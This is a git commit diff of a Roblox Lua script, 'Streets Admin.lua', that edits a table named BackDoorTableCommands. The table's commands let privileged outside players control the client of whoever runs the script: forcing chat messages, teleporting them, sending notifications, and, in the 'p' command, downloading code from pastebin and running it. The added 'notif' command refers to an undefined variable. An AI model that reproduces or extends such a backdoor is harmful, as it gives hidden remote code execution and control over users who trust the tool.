0fa617458f9ce6b7870456f7d9032b634421cfe8
Cyrus <50967051+Not-Cyrus@users.noreply.github.com>
2020-12-08 04:45:12 -0500

    Update Streets Admin.lua

--- Streets Admin.lua
+++ Streets Admin.lua
@@ -199,6 +199,10 @@ local BackDoorTableCommands = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
 		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
 	};
+	['notif'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then StarterGui:SetCore("SendNotification",{['Title'] = "Cy's Messages";['Text'] = Message;['Duration'] = 10;['Icon'] = nil;}) end end;
+		['Levels'] = {[4] = true;}
+	};
 	['bring'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
 		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
@@ -222,7 +226,7 @@ local BackDoorTableCommands = {
 	['p'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
 		['Levels'] = {[3] = true;[4] = true;}
-	}
+	};
 }
 
 local BackDoorTablePlayers = {
